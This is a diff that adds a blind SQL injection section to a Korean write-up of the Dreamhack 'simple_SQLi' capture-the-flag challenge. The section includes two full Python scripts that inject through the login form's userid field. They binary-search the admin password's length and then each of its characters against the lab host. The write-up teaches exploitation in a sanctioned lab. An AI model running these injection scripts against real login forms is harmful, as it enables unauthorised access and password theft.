@@ -6,7 +6,7 @@
 
 SQLite는 데이터 관리를 위한 일부 필수 기능만을 지원하기 때문에, 다른 DBMS에 비해 **비교적 경량화된** DBMS로 널리 알려져 있다.
 
-따라서 SQLite는 많은 양의 컴퓨팅 리소스를 제공하기 어려운 임베디드 장비, 비교적 복잡하지 않은 독립실행향(Standalone) 프로그램에서 사용되며, 개발 단계의 편의성 또는 프로그램의 안전성을 제공한다.
+따라서 SQLite는 많은 양의 컴퓨팅 리소스를 제공하기 어려운 임베디드 장비, 비교적 복잡하지 않은 독립실행형(Standalone) 프로그램에서 사용되며, 개발 단계의 편의성 또는 프로그램의 안전성을 제공한다.
 
 ## 문제 목표 및 기능 요약
 
@@ -179,3 +179,179 @@ SQL Injection으로 로그인 인증을 우회하여 로그인만 하는 방법�
 **Prepared Statement**는 동적 쿼리가 전달되면 내부적으로 쿼리 분석을 수행해 안전한 쿼리문을 생성한다.
 
 ## 2. Blind SQL Injection
+
+이번엔 `users` 테이블에 저장되어 있는 `userpassword` 값을 읽는 Blind SQL Injection 자동화 코드를 작성하여 익스플로잇을 해보자.
+
+비밀번호를 구성할 수 있는 문자의 개수를 출력 가능한 아스키 문자로 제한했을 때, 한 자리에 들어갈 수 있는 문자의 종류는 94개이다. (`0x20 ~ 0x7E`)
+
+만약 비밀번호의 경우의 수를 생각해본다면, 비밀번호가 10자리인 경우 총 `94^10` 개의 경우의 수가 존재하기 때문에 이를 모두 조사하는 것은 거의 불가능하다.
+
+하지만 우리는 모든 경우의 수를 찾아보는게 아니라, **한 자리씩 검증하기 때문에 최대 `940 = 94 x 10`개의 쿼리문**으로 비밀번호를 찾아낼 수 있다.
+
+`Binary Search`를 이용하면 $\log_{2} 940$ 으로 `65`개의 쿼리문으로 훨씬 축소된다.
+
+65개의 쿼리 정도면 적어보일 수 있지만, 이 또한 수동으로 계속 쿼리문을 날리는 것보단 자동화 스크립트를 작성하여 쿼리문을 날리는 것이 훨씬 효율적일 것이다.
+
+### 로그인 요청의 폼 구조 파악
+
+자동화 스크립트에 쿼리문을 작성하려면, 로그인할 때 전송하는 `POST` 데이터의 구조를 파악해야 한다. 과정은 아래와 같다.
+
+1. 개발자 도구의 `Network` 탭을 열고, `Preserve log` 클릭 (`Preserve log`는 페이지를 이동하거나 새로고침해도 네트워크 로그들을 지우지 않고 유지해줌)
+
+<img width="1540" alt="image" src="https://github.com/user-attachments/assets/05875111-0d4e-4a25-8f4e-0cd875aa47e8">
+
+2. `userid`와 `userpassword`에 "guest"를 입력 후 Login 버튼 클릭
+
+3. Network 탭의 메시지 목록에서 `POST` 요청 찾기 (`GET`은 폼 데이터가 존재하지 않음)
+
+<img width="702" alt="image" src="https://github.com/user-attachments/assets/760b792e-136d-4748-830b-b528586a42cf">
+
+4. `Payload`에서 `Form Data` 구조 확인
+
+<img width="699" alt="image" src="https://github.com/user-attachments/assets/76eb756e-915b-423c-9836-3f858c70fcd5">
+
+해당 과정을 통해 `app.py` 코드에서도 확인할 수 있지만, **코드가 없을 경우 로그인 할 때 입력되는 값이 `userid` 필드와 `userpassword` 필드로 전송되는 것을 확인할 수 있다.**
+
+### 비밀번호 길이 파악
+
+비밀번호를 알아내기 위해 비밀번호가 최대 몇자리로 이루어져있는지 확인해야한다. 이를 위해서 아래와 같이 `Binary Search`를 통해 `"admin"` 계정의 비밀번호 길이를 찾아내는 파이썬 스크립트를 작성할 수 있다.
+
+```
+#!/usr/bin/python3
+import requests
+import sys
+from urllib.parse import urljoin
+
+
+class Solver:
+    """Solver for simple_SQLi challenge"""
+    
+    # initialization
+    def __init__(self, port: str) -> None:
+        self._chall_url = f"http://host1.dreamhack.games:{port}"
+        self._login_url = urljoin(self._chall_url, "login")
+        
+    # base HTTP methods
+    def _login(self, userid: str, userpassword: str) -> bool:
+        login_data = {
+            "userid": userid,
+            "userpassword": userpassword
+        }
+        resp = requests.post(self._login_url, data=login_data)
+        return resp
+
+    # base sqli methods
+    def _sqli(self, query: str) -> requests.Response:
+        resp = self._login(f"\" or {query}-- ", "hi")
+        return resp
+        
+    def _sqli_lt_binsearch(self, query_tmpl: str, low: int, high: int) -> int:
+        while 1:
+            mid = (low+high) // 2
+            if low+1 >= high:
+                break
+            query = query_tmpl.format(val=mid)
+            if "hello" in self._sqli(query).text:
+                high = mid
+            else:
+                low = mid
+        return mid
+        
+    # attack methods
+    def _find_password_length(self, user: str, max_pw_len: int = 100) -> int:
+        query_tmpl = f"((SELECT LENGTH(userpassword) WHERE userid=\"{user}\")<{{val}})"
+        pw_len = self._sqli_lt_binsearch(query_tmpl, 0, max_pw_len)
+        return pw_len
+        
+    def solve(self):
+        pw_len = solver._find_password_length("admin")
+        print(f"Length of admin password is: {pw_len}")
+        
+        
+if __name__ == "__main__":
+    port = sys.argv[1]
+    solver = Solver(port)
+    solver.solve()
+```
+
+코드의 실행 결과는 아래와 같고, `app.py` 소스코드에서도 16바이트 랜덤한 문자열을 만든 후 `hex`로 출력했기 때문에, 비밀번호의 길이가 총 32자리(32바이트)임을 알 수 있다.
+
+<img width="730" alt="image" src="https://github.com/user-attachments/assets/4574a70f-c3a3-4319-b485-7c25b0fe89ac">
+
+### 비밀번호 찾기
+
+이제 비밀번호의 길이를 찾았기 때문에, 구한 비밀번호의 길이까지 한 글자씩 비밀번호를 알아내는 코드를 작성해보자. `Binary Search`를 활용한 자동화 스크립트 코드는 아래와 같다.
+
+```
+#!/usr/bin/python3
+import requests
+import sys
+from urllib.parse import urljoin
+
+
+class Solver:
+    """Solver for simple_SQLi challenge"""
+
+    # initialization
+    def __init__(self, port: str) -> None:
+        self._chall_url = f"http://host1.dreamhack.games:{port}"
+        self._login_url = urljoin(self._chall_url, "login")
+
+    # base HTTP methods
+    def _login(self, userid: str, userpassword: str) -> requests.Response:
+        login_data = {"userid": userid, "userpassword": userpassword}
+        resp = requests.post(self._login_url, data=login_data)
+        return resp
+
+    # base sqli methods
+    def _sqli(self, query: str) -> requests.Response:
+        resp = self._login(f'" or {query}-- ', "hi")
+        return resp
+
+    def _sqli_lt_binsearch(self, query_tmpl: str, low: int, high: int) -> int:
+        while 1:
+            mid = (low + high) // 2
+            if low + 1 >= high:
+                break
+            query = query_tmpl.format(val=mid)
+            if "hello" in self._sqli(query).text:
+                high = mid
+            else:
+                low = mid
+        return mid
+
+    # attack methods
+    def _find_password_length(self, user: str, max_pw_len: int = 100) -> int:
+        query_tmpl = f'((SELECT LENGTH(userpassword) WHERE userid="{user}") < {{val}})'
+        pw_len = self._sqli_lt_binsearch(query_tmpl, 0, max_pw_len)
+        return pw_len
+
+    def _find_password(self, user: str, pw_len: int) -> str:
+        pw = ""
+        for idx in range(1, pw_len + 1):
+            query_tmpl = f'((SELECT SUBSTR(userpassword,{idx},1) WHERE userid="{user}") < CHAR({{val}}))'
+            pw += chr(self._sqli_lt_binsearch(query_tmpl, 0x2F, 0x7E))
+            print(f"{idx}. {pw}")
+        return pw
+
+    def solve(self) -> None:
+        # Find the length of admin password
+        pw_len = solver._find_password_length("admin")
+        print(f"Length of the admin password is: {pw_len}")
+        # Find the admin password
+        print("Finding password:")
+        pw = solver._find_password("admin", pw_len)
+        print(f"Password of the admin is: {pw}")
+
+
+if __name__ == "__main__":
+    port = sys.argv[1]
+    solver = Solver(port)
+    solver.solve()
+```
+
+코드의 실행 결과는 아래와 같고, 찾은 비밀번호를 통해 로그인하면 로그인에 성공한다. `app.py` 소스코드에서도 16바이트 랜덤한 문자열을 만든 후 `hex`로 출력했기 때문에, 총 32바이트 길이의 비밀번호가 나온다.
+
+<img width="699" alt="image" src="https://github.com/user-attachments/assets/3e2613fb-dc14-46a7-916f-fa8d80691438">
+
+참고로 만약 실행하다가, **Connection timed out** 연결 시간 초과 에러가 발생하면, `try...except` 구문으로 에러를 핸들링하거나, 공격에 성공할 때 까지 스크립트를 계속 실행하여 해결하는 방법이 있다.
